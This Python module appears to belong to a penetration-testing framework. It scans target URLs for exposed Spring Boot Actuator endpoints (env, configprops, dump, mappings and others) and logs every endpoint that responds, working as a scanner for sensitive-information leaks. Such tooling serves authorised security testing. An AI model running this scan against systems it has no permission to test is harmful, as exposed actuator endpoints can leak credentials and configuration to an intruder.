from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option, OptArgset
from zerooo.request.httpclient import HttpClient


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'Spring Boot Actuaotr配置不当导致敏感信息泄露',
            'Module': 'auxiliary/scanner/springboot/actuaotr',
            'Product': 'springboot',
            'Cve': '',
            'Create_date': '20220801',
            'Description': 'Spring Boot Actuaotr配置不当导致敏感信息泄露',
            'Authors': '',
            'References': ''
        }

        self.option = {
            'urls': {'Current Setting': OptArgset.urls, 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'}
        }

    async def spride_actuaotr(self, urls):
        payload = ['autoconfig', 'beans', 'env', 'configprops', 'dump', 'health', 'info', 'mappings',
                   'metrics',
                   'trace']
        resp_set = []
        for i in payload:
            vul_urls = urls + i
            resp = await HttpClient().send_request_cgi('GET', url=vul_urls)
            resp_set.append(resp)

        return resp_set

    @staticmethod
    def spride_actuaotr_callback(future):
        resp = future.result()
        for i in resp:
            if i:
                # if resp['code'] == 200:
                LOGGER.success(i['url'] + ':' + i['code'])
        #     else:
        #         msg = f'目标不存在漏洞 (The target not find vuln): {resp["url"]}'
        #         LOGGER.info(msg)
        # else:
        #     msg = f'目标不存在漏洞 (The target not find vuln): {resp["url"]}'
        #     LOGGER.info(msg)

    def exploit(self):
        urls = self.get_options('urls')
        limit = self.get_options('limit')
        async_run(self.spride_actuaotr, urls, self.spride_actuaotr_callback, limit)
        LOGGER.info('运行完成 (exploit complete)')
